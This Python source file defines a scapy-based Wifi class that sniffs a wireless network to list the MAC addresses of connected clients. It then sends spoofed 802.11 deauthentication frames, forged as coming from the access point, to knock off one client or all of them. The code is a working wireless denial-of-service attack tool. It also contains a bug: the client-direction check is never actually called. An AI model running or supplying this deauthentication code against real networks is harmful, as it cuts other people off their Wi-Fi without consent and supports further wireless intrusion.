from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff


class Wifi:
    def __init__(self, SSID, BSSID, dBm_signal, channel, crypto):
        self.SSID: str = SSID
        self.BSSID: str = BSSID
        self.dBm_signal: str = dBm_signal
        self.channel: int = channel
        self.crypto: str = crypto
        self.beacon_interval: int
        self.bitrate: int
        self.frequency_band: str
        self.clients: list[str] = []

    def __eq__(self, other):
        if (isinstance(other, Wifi)):
            return self.SSID == other.SSID
        return False

    def __str__(self) -> str:
        return self.SSID

    def __repr__(self):
        return str(self)

    def get_clients(self) -> list[dict[str, str]]:
        """Function to get all clients connected to the AP

        Returns:
            list: of dicts for each client containing the MAC address and the SSID
        """
        return [{"MAC": client, "SSID": self.SSID} for client in self.clients]

    def get_clients_on_ap(self, timeout: int, iface: str) -> None:
        """Append detected client mac-addresses to clientlist for wifi

        Args:
            timeout (int): Time to run sniff
            iface (str): Interface to sniff
        """

        def _is_packet_from_client(packet) -> bool:
            """Checks whether the packet is sent from the client to AP, returns true if from client"""
            fcfield = packet[Dot11].FCfield & 0x3

            # Extract to_ds and from_ds values
            to_ds = (fcfield & 0x1) != 0
            from_ds = (fcfield & 0x2) != 0

            if not to_ds and from_ds:
                # Packet is sent from AP to client
                return False
            elif to_ds and not from_ds:
                # Packet is sent from client to AP
                return True
            else:
                # Invalid configuration (e.g., ad-hoc mode)
                raise ValueError

        def _callback(packet) -> None:
            # Checks if a packet meets requirements to be
            # added as a client connected to the ap defined in get_clients_on_ap

            if packet.haslayer(Dot11):
                if _is_packet_from_client:  # type: ignore[truthy-function]
                    # extract the MAC address of the client
                    src_BSSID = packet[Dot11].addr1
                    # check if destination address is as specified
                    if packet[Dot11].addr2 == self.BSSID:
                        self.clients.append(src_BSSID)

        sniff(timeout=timeout, iface=iface, prn=_callback)

    def deauth_client(self, iface: str, target_mac: str, reason: int = 7) -> None:
        """Deauthenticate a specific client from a wifi

        Args:
            iface (str): The interface to send deauth packet
            target_mac (str): MAC address for the client to be targeted
            reason (int, optional): Reasoncode for deauthentication. Defaults to 7.
        """
        packet = RadioTap() / \
            Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.BSSID, addr3=self.BSSID) / \
            Dot11Deauth(reason=reason)

        print("Created deauth packet")
        print("Sending deauth packet")
        sendp(packet, iface=iface)
        print("Deauth was sent successfully")

    def deauth_all(self, iface: str, reason: int = 6) -> None:
        """Deauthenticate all clients registered on wifi

        Args:
            iface (str): Interface to send deauth packets
            reason (int, optional): Reasoncade for deauthentication. Defaults to 6.
        """
        for client in self.clients:
            self.deauth_client(iface, client, reason=reason)
